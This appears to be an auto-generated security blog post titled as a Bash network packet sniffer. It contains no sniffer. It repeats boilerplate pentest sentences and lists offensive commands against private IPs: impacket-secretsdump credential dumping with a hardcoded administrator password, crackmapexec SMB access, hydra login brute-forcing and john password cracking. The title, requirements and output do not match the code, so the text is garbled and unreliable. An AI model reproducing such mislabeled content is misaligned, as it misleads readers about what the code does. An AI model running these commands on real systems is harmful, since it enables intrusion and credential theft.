---
TitleSEO: "Network Packet Sniffer in Bash | ZureFX"
TitlePost: "Network Packet Sniffer — Bash"
Author: "ZureFX"
Description: "A Bash script for network packet sniffer. Built for security research and automation."
Keywords: "automation, scanner, fuzzer, bash"
URL: "https://zurefx.github.io/scripting/script-network-packet-sniffer-189.html"
URL_IMAGES: ""
Date: "2025-05-27"
Tags: "Automation, Scanner, Fuzzer, Bash"
Section: "scripting"
Lang: "en"
main_img: "script-network-packet-sniffer-189"
Permalink: "/scripting/script-network-packet-sniffer-189.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

Command injection was possible through unsanitized user input in the search functionality. Weak file permissions allowed modification of critical system files. The database credentials were hardcoded in the application source code.

Built with **Bash** for offensive security automation.

### Requirements

- Bash
- `hashcat`
- `GetNPUsers`
- `kerbrute`

## Implementation

### Core Logic

Weak file permissions allowed modification of critical system files. Authentication bypass was achieved through careful manipulation of the login mechanism.

```bash
nmap -sCV -p135,587,25 10.99.201.91 -oN scan.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.116.53.155
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Authentication bypass was achieved through careful manipulation of the login mechanism. The application stored sensitive credentials in an unencrypted configuration file.

### Helper Functions

Authentication bypass was achieved through careful manipulation of the login mechanism. Post-exploitation enumeration revealed a path to domain administrator privileges.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.16.44.144
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.90.176.182/FUZZ
crackmapexec smb 10.129.165.242 -u administrator -p 'P@ssw0rd!' --shares
impacket-secretsdump administrator:'P@ssw0rd!'@10.33.130.230
```

## Usage

### Basic Usage

Token impersonation allowed elevation to SYSTEM privileges on the target. Authentication bypass was achieved through careful manipulation of the login mechanism.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.128.217.25/FUZZ
feroxbuster -h
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.40.21.247 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
gobuster dir -u http://10.116.166.249/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

### Advanced Options

Network traffic analysis revealed unencrypted communications containing user credentials. Initial enumeration revealed several interesting open ports on the target. Initial enumeration revealed several interesting open ports on the target.

```bash
nmap -sCV -p5985,8443,143 10.16.146.152 -oN scan.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.48.30.112
crackmapexec smb 10.112.12.172 -u administrator -p 'P@ssw0rd!' --shares
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

## Output

### Example Output

Weak file permissions allowed modification of critical system files. Post-exploitation enumeration revealed a path to domain administrator privileges.

```
[+] Scanning target...
[+] Found 1 results
[+] Done in 23.10s
```
